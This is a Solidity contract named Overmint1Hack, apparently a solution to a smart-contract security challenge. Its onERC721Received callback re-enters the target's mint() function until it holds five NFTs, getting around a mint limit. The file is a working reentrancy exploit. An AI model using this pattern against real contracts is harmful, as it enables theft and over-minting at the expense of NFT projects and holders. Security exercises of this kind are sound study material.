// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

interface IMint is IERC721 {
    function mint() external;

    function success(address _attacker) external view returns (bool);
}

contract Overmint1Hack {
    IMint public immutable nftContract;

    constructor(address _addressToHack) {
        nftContract = IMint(_addressToHack);
    }

    function hackMint() external {
        nftContract.mint();
        require(nftContract.success(address(this)), "No success");
    }

    /**
     * @dev See {IERC721Receiver-onERC721Received}.
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (nftContract.balanceOf(address(this)) < 5) {
            nftContract.mint();
        }
        return
            bytes4(
                keccak256("onERC721Received(address,address,uint256,bytes)")
            );
    }
}
